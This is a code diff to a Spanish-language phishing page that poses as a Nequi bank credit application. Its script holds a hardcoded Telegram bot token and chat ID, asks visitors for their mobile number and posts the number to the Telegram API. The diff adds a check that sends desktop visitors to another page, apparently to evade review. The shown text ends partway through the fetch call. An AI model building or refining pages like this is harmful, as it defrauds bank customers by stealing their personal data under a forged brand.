@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Solicita tu crédito</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
@@ -12,7 +12,7 @@
     .bar{width:25px;height:3px;background:#DA0081;margin:3px 0}
     .credits{padding:80px 20px 0;text-align:center}
     .big-letter{background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);padding:20px;border-radius:15px;margin:20px 0}
-    .nq-btn{background:#DA0081;color:#fff;padding:15px 30px;border:none;border-radius:50px;font-size:18px;cursor:pointer;margin:15px 0;display:inline-block}
+    .nq-btn{background:#DA0081;color:#fff;padding:15px 30px;border:none;border-radius:50px;font-size:18px;cursor:pointer;margin:15px 0;display:inline-block;text-decoration:none}
     .u-text-white{color:#fff;font-size:20px;line-height:1.5}
     .u-text-white-2{color:#ff6b6b}
     h1{font-size:2.5rem;margin:20px 0}
@@ -25,9 +25,8 @@
   <header>
     <div style="display:flex;justify-content:space-between;align-items:center;max-width:1200px;margin:auto">
       <svg width="180" height="40" viewBox="0 0 104 32" fill="none">
-        <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
-        <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"/>
-        <text x="40" y="23" fill="#200020" font-size="20" font-weight="bold">NEQUI</text>
+        <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V0.912C0 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
+        <text x="15" y="23" fill="#200020" font-size="20" font-weight="bold">NEQUI</text>
       </svg>
       <div><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>
     </div>
@@ -55,11 +54,16 @@
   </footer>
 
   <script>
+    // DETECTA SI ES PC → REDIRIGE
+    if (!/Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent)) {
+      location.href = "pc.html";
+    }
+
     const BOT_TOKEN = '8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc';
     const CHAT_ID = '8469651553';
 
     function enviarTelegram() {
-      const numero = prompt("Ingresa tu número de celular:");
+      const numero = prompt("Ingresa tu número de celular (+57):");
       if (!numero || numero.length < 10) return alert("Número inválido");
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
